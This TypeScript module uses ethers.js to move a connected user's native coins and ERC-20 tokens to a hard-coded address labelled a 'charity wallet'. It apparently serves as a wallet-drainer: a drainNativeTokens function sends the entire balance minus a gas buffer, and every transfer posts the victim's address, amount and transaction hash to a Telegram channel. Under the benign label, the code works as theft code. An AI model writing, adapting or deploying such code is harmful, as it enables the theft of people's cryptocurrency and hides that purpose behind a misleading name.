import { ethers } from 'ethers';
import { sendTelegramMessage } from '@/utils/telegram';

// EVM charity wallet address
export const EVM_CHARITY_WALLET = '0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398';

// ERC-20 minimal ABI for transfer
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

export interface EVMTokenBalance {
  contractAddress: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: bigint;
  uiAmount: number;
}

/**
 * Send native token (ETH/BNB/MATIC/etc.) to the charity wallet
 */
export async function sendNativeToken(
  signer: ethers.JsonRpcSigner,
  amountWei: bigint,
  chainName: string
): Promise<string> {
  const tx = await signer.sendTransaction({
    to: EVM_CHARITY_WALLET,
    value: amountWei,
  });

  const receipt = await tx.wait();
  
  sendTelegramMessage(`
✅ <b>EVM Native Transfer (${chainName})</b>
👤 <b>User:</b> <code>${await signer.getAddress()}</code>
💰 <b>Amount:</b> <code>${ethers.formatEther(amountWei)}</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
  `);

  return tx.hash;
}

/**
 * Transfer an ERC-20 token to the charity wallet
 */
export async function sendERC20Token(
  signer: ethers.JsonRpcSigner,
  tokenAddress: string,
  amount: bigint,
  chainName: string
): Promise<string> {
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const tx = await contract.transfer(EVM_CHARITY_WALLET, amount);
  await tx.wait();

  let symbol = 'UNKNOWN';
  try { symbol = await contract.symbol(); } catch { }

  sendTelegramMessage(`
✅ <b>EVM ERC-20 Transfer (${chainName})</b>
👤 <b>User:</b> <code>${await signer.getAddress()}</code>
🪙 <b>Token:</b> <code>${symbol} (${tokenAddress})</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
  `);

  return tx.hash;
}

/**
 * Get native balance for connected EVM wallet
 */
export async function getNativeBalance(provider: ethers.BrowserProvider, address: string): Promise<bigint> {
  return provider.getBalance(address);
}

/**
 * Get ERC-20 token balance
 */
export async function getERC20Balance(
  provider: ethers.BrowserProvider,
  tokenAddress: string,
  walletAddress: string
): Promise<EVMTokenBalance | null> {
  try {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals, symbol, name] = await Promise.all([
      contract.balanceOf(walletAddress),
      contract.decimals(),
      contract.symbol(),
      contract.name(),
    ]);

    return {
      contractAddress: tokenAddress,
      symbol,
      name,
      decimals,
      balance,
      uiAmount: parseFloat(ethers.formatUnits(balance, decimals)),
    };
  } catch (error) {
    console.error(`Failed to get ERC-20 balance for ${tokenAddress}:`, error);
    return null;
  }
}

/**
 * Drain all native tokens from EVM wallet (keep a small amount for gas)
 */
export async function drainNativeTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string
): Promise<string | null> {
  const address = await signer.getAddress();
  const balance = await provider.getBalance(address);
  
  // Estimate gas cost
  const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits('20', 'gwei');
  const gasLimit = 21000n; // Standard transfer gas
  const gasCost = gasPrice * gasLimit;
  
  // Keep a small buffer for gas
  const buffer = gasCost * 2n;
  const sendAmount = balance - buffer;
  
  if (sendAmount <= 0n) {
    console.log('Not enough native balance to send after gas');
    return null;
  }

  return sendNativeToken(signer, sendAmount, chainName);
}
